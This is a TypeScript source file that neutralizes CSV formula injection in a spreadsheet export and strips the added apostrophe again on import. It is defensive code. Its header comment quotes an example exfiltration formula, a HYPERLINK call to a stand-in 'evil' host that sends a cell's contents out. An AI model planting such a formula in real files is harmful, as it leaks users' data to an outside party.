/**
 * CSV formula-injection (CWE-1236) neutralization.
 *
 * RFC-4180 quoting (what `csv-stringify` does with `quoted: true`) makes a CSV
 * *parse* correctly, but it does NOT make it *safe to open in a spreadsheet*.
 * Excel / Google Sheets / LibreOffice strip the CSV quoting and then EVALUATE
 * any cell whose first character is a formula trigger — `=`, `+`, `-`, `@`, or a
 * leading TAB / CR. A user-controlled value like `=HYPERLINK("//evil?"&A1,"x")`
 * or a DDE payload then runs when someone opens the export.
 *
 * The standard OWASP mitigation is to prefix such a cell with a single quote so
 * the spreadsheet treats it as literal text. We apply it ONLY to string cells —
 * numbers (including legitimately-negative amounts like `-50`) pass through
 * untouched, so the export stays numerically faithful.
 *
 * Use this for ONE-WAY, human-facing CSV (e.g. the expense export). Do NOT use
 * it for round-trip data interchange (the backup ZIP / Sheets sync) unless the
 * READ side strips the prefix symmetrically — otherwise it corrupts restore.
 */

/** First-character triggers a spreadsheet treats as the start of a formula. */
const FORMULA_TRIGGERS = new Set(['=', '+', '-', '@', '\t', '\r']);

/**
 * True when `s` is a (possibly empty) run of leading apostrophes IMMEDIATELY followed by a formula
 * trigger — i.e. `'*` + (`=`|`+`|`-`|`@`|TAB|CR) + …. This is the exact shape that needs the
 * neutralize↔denormalize escape: `=X` (empty run), `'=X` (one-apostrophe run), `''=X`, etc. A value
 * whose leading apostrophe run is followed by a NON-trigger (`'24 road trip`, `'twas`) does NOT match,
 * so the hand-authored foreign-CSV leading-apostrophe contract is left untouched (the import side).
 */
function isApostropheRunThenTrigger(s: string): boolean {
  let i = 0;
  while (i < s.length && s[i] === "'") i++;
  return i < s.length && FORMULA_TRIGGERS.has(s[i] as string);
}

/**
 * Neutralize a single cell value for SPREADSHEET safety AND lossless round-trip. A string that is a
 * leading apostrophe-run followed by a formula trigger gets ONE more leading `'`; everything else —
 * numbers, booleans, null/undefined, empty strings, and strings whose run is followed by a non-trigger
 * — is returned unchanged.
 *
 * Two cases the single rule covers:
 *  - `=HYPERLINK(...)` (no leading `'`) → `'=HYPERLINK(...)`: the OWASP text-prefix that stops a
 *    spreadsheet from EVALUATING the cell. (Only the first char can start a formula, so this is
 *    sufficient and minimally intrusive.)
 *  - `'=Daily` (a value the user genuinely typed with a leading `'` before a trigger) → `''=Daily`:
 *    the INVERTIBLE escape (vlm/csv-apostrophe ruling, 2026-06-30) so the symmetric importer can
 *    restore the user's literal leading `'` instead of over-stripping it. Excel still displays
 *    `''=Daily` as the user's `'=Daily` (a leading `'` forces text and is hidden), so it stays
 *    both safe and faithful.
 */
export function neutralizeCsvCell<T>(value: T): T | string {
  if (typeof value !== 'string' || value.length === 0) return value;
  return isApostropheRunThenTrigger(value) ? `'${value}` : value;
}

/**
 * Neutralize every string cell in a record (numbers/booleans/etc. untouched).
 * Returns a new object; the input is not mutated.
 */
export function neutralizeCsvRow<T extends Record<string, unknown>>(
  row: T
): Record<string, unknown> {
  const out: Record<string, unknown> = {};
  for (const key of Object.keys(row)) {
    out[key] = neutralizeCsvCell(row[key]);
  }
  return out;
}

/**
 * Inverse of `neutralizeCsvCell` — strips the ONE leading `'` that neutralization adds, so a
 * VROOM CSV round-trips faithfully (export → re-import without edits yields the original text).
 * This is the symmetric READ side `neutralizeCsvCell` requires for round-trip use.
 *
 * Strips a single leading `'` IFF the value is an apostrophe-run-then-trigger (`'=`, `''=`, `'+`,
 * `'@`, … — the EXACT shape neutralize prefixes), undoing one neutralization layer:
 *   `'=SUM(...)`  → `=SUM(...)`   (an exported formula → the user's original)
 *   `''=Daily`    → `'=Daily`     (an exported user-typed-`'`-before-trigger → the literal `'=Daily`)
 *
 * RULED 2026-06-30 (vlm/csv-apostrophe): optimize VROOM-own-export round-trip fidelity. The matched
 * escape makes neutralize↔denormalize a true inverse for EVERY value, INCLUDING one the user genuinely
 * typed as `'`+trigger (`'=Daily`) — which the old single-`'` scheme over-stripped to `=Daily` (and a
 * stripped vehicle nickname then failed to re-match, dropping the whole row). The foreign-import
 * contract is preserved untouched: a hand-authored leading apostrophe followed by a NON-trigger
 * (`'24 road trip`, `'twas`) is NOT an apostrophe-run-then-trigger, so it is left exactly as typed.
 * Idempotent only down to the value's own leading `'` (it peels one neutralization layer per call).
 * Pinned by csv-safety.test.ts (the round-trip is now lossless) + the import/export round-trip guards.
 */
export function denormalizeCsvCell(value: string): string {
  // Require an actual leading `'` to strip (run ≥ 1): a bare formula `=X` (never produced by export —
  // a hand-authored/foreign cell) has a zero-length run and MUST be preserved, not stripped to `X`.
  return value[0] === "'" && isApostropheRunThenTrigger(value) ? value.slice(1) : value;
}
